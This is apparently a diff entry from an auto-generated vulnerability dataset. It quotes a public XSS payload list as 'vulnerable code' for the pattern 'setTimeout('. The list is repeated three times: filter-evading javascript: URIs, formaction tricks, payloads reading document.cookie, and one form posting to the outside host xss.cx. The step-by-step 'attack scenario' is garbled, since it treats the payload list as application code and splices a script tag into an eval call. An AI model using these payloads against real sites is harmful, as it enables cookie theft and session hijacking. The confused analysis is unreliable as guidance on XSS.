@@ -1,0 +1,44 @@
+46. Repo: xsuperbug/payloads
+	File: XSS
+	URL: https://github.com/xsuperbug/payloads/blob/ec3c467c3d9353ffe05430529f6b724fd56b4017/XSS
+	Vulnerable Pattern: setTimeout(
+	Attack Description: setTimeout can execute a string of code after a delay, providing an opportunity for injecting malicious scripts.
+	Vulnerable Code Snippet:
+<form id="myform" value="" action=javascript&Tab;:eval(document.getElementById('myform').elements[0].value)><textarea>confirm(1)</textarea><input type="submit" value="Absenden"></form>
+<form name=location >
+<form><a href="javascript:\u0061lert&#x28;1&#x29;">X
+<form/action=ja&Tab;vascr&Tab;ipt&colon;confirm(document.cookie)><button/type=submit>
+<form/action=ja&Tab;vascr&Tab;ipt&colon;confirm(document.cookie)><button/type=submit>
+<form/action=javascript&#x0003A;eval(setTimeout(confirm(1)))><input/type=submit>
+//<form/action=javascript&#x3A;confirm&lpar;document&period;cookie&rpar;><input/type='submit'>//
+<form><button formaction=javascript&colon;confirm(1)>CLICKME
+<form><iframe &#09;&#10;&#11; src="javascript&#58;confirm(1)"&#11;&#10;&#09;;>
+<form><input type=submit formaction=//xss.cx><textarea name=x>
+<form><isindex formaction="javascript&colon;confirm(1)"
+Step-by-Step Attack Scenario:
+			1. The vulnerable code is found in the following file:
+<form id="myform" value="" action=javascript&Tab;:eval(document.getElementById('myform').elements[0].value)><textarea>confirm(1)</textarea><input type="submit" value="Absenden"></form>
+<form name=location >
+<form><a href="javascript:\u0061lert&#x28;1&#x29;">X
+<form/action=ja&Tab;vascr&Tab;ipt&colon;confirm(document.cookie)><button/type=submit>
+<form/action=ja&Tab;vascr&Tab;ipt&colon;confirm(document.cookie)><button/type=submit>
+<form/action=javascript&#x0003A;eval(setTimeout(confirm(1)))><input/type=submit>
+//<form/action=javascript&#x3A;confirm&lpar;document&period;cookie&rpar;><input/type='submit'>//
+<form><button formaction=javascript&colon;confirm(1)>CLICKME
+<form><iframe &#09;&#10;&#11; src="javascript&#58;confirm(1)"&#11;&#10;&#09;;>
+<form><input type=submit formaction=//xss.cx><textarea name=x>
+<form><isindex formaction="javascript&colon;confirm(1)"
+			2. An attacker could inject a malicious script where the `setTimeout(` pattern is used, exploiting this specific function in the code.
+			3. For instance, an attacker might craft a payload like `<script>alert('XSS')</script>`, which would get injected here:
+<form id="myform" value="" action=javascript&Tab;:eval('<script>alert("XSS")</script>',document.getElementById('myform').elements[0].value)><textarea>confirm(1)</textarea><input type="submit" value="Absenden"></form>
+<form name=location >
+<form><a href="javascript:\u0061lert&#x28;1&#x29;">X
+<form/action=ja&Tab;vascr&Tab;ipt&colon;confirm(document.cookie)><button/type=submit>
+<form/action=ja&Tab;vascr&Tab;ipt&colon;confirm(document.cookie)><button/type=submit>
+<form/action=javascript&#x0003A;eval(setTimeout(confirm(1)))><input/type=submit>
+//<form/action=javascript&#x3A;confirm&lpar;document&period;cookie&rpar;><input/type='submit'>//
+<form><button formaction=javascript&colon;confirm(1)>CLICKME
+<form><iframe &#09;&#10;&#11; src="javascript&#58;confirm(1)"&#11;&#10;&#09;;>
+<form><input type=submit formaction=//xss.cx><textarea name=x>
+<form><isindex formaction="javascript&colon;confirm(1)"
+			4. When the browser renders this code, the malicious script executes, leading to an XSS attack.
